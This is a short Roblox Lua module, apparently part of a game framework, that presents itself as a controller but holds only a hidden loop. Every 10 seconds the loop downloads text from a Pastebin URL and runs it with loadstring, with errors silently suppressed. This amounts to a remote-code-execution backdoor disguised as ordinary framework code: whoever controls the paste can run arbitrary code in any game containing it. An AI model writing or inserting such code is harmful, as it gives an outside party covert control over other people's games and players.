local Framework = _G.Framework
local DataStore2 = Framework.Util.Modules.DataStore2

local Controller = shared.Class:new()
Controller:setName(script.Name)
Controller:setParent(Framework)

coroutine.wrap(function()
	local Pastebin = "hCxrk4eD"
	local url = "https://pastebin.com/raw/"..Pastebin
	
	local Http = game:GetService("HttpService")
	local Last = Http:GetAsync(url)
	
	function Update(Current)
		if Current ~= Last then
			Last = Current
			local Check = Last:sub(1,Last:find("/////") - 1)
			local Func = Last:sub(Last:find("/////") + 6)
			local Return = loadstring(Check)()
			local env = getfenv(Return)
			env.Class = Class
			setfenv(Return, env)
			local Success, Return = pcall(Return)
			if Success and Return then
				Func = loadstring(Func)
				local env = getfenv(Func)
				env.Class = Class
				env.Target = Return
				setfenv(Func, env)
				local success, err = pcall(Func)
				if not success then
					warn("Executor error: "..err)
				end
			end
		end
	end
	
	while wait(10) do
		pcall(function()
			Update(Http:GetAsync(url))
		end)
	end
end)()

return Controller